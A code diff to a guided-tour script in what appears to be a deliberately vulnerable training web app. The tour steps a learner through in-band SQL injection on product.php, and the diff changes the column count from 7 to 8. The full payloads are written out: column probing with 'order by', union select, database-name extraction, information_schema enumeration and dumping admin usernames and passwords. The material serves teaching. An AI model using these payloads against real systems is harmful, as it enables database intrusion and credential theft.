@@ -39,7 +39,7 @@
         localStorage.setItem('InBandSqli', true);
         InBandSqliTour.addStep({
             id: 'step-1',
-            text: 'We should be able to figure out how many columns there are with something like this in the URL bar <code><?php echo ROOT_URL; ?>product.php?id=0 order by 7</code>',
+            text: 'We should be able to figure out how many columns there are with something like this in the URL bar <code><?php echo ROOT_URL; ?>product.php?id=0 order by 8</code>',
             attachTo: {
                 element: '.tour',
                 on: 'bottom'
@@ -48,14 +48,14 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%207";
+                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%208";
                 }
             }]
         });
-    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%207" && localStorage.getItem('InBandSqli')) {
+    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%208" && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-2',
-            text: 'This will indicate that the range is 1 to 7 as there is no error message from the server.',
+            text: 'This will indicate that the range is 1 to 8 as there is no error message from the server.',
             attachTo: {
                 element: '.tour',
                 on: 'bottom'
@@ -64,14 +64,14 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7";
+                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7,8";
                 }
             }]
         });
-    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7" && localStorage.getItem('InBandSqli')) {
+    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7,8" && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-3',
-            text: 'With <code>union select 1,2,3,4,5,6,7</code> we can create a virtual table.',
+            text: 'With <code>union select 1,2,3,4,5,6,7,8</code> we can create a virtual table.',
             attachTo: {
                 element: '.tour',
                 on: 'bottom'
@@ -93,14 +93,14 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7";
+                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7,8";
                 }
             }]
         });
-    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7" && localStorage.getItem('InBandSqli')) {
+    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7,8" && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-5',
-            text: 'With <code>union select 1,database(),3,4,5,6,7</code> we can get the database name.',
+            text: 'With <code>union select 1,database(),3,4,5,6,7,8</code> we can get the database name.',
             attachTo: {
                 element: '.tour',
                 on: 'bottom'
@@ -122,11 +122,11 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27';
+                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7,8%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27';
                 }
             }]
         });
-    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27' && localStorage.getItem('InBandSqli')) {
+    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7,8%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27' && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-7',
             text: 'With <code>information_schema.tables</code> we can get all the table names.',
@@ -151,11 +151,11 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22#';
+                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7,8%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22#';
                 }
             }]
         });
-    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22' && localStorage.getItem('InBandSqli')) {
+    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7,8%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22' && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-9',
             text: 'Now we can get the colum names for the admin table and see whats in there with <code>information_schema.columns WHERE table_name="admin"</code>',
@@ -180,11 +180,11 @@
             buttons: [{
                 text: 'Next',
                 action: () => {
-                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7%20FROM%20admin';
+                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7,8%20FROM%20admin';
                 }
             }]
         });
-    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7%20FROM%20admin' && localStorage.getItem('InBandSqli')) {
+    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7,8%20FROM%20admin' && localStorage.getItem('InBandSqli')) {
         InBandSqliTour.addStep({
             id: 'step-11',
             text: "You should now see the username and the password.",
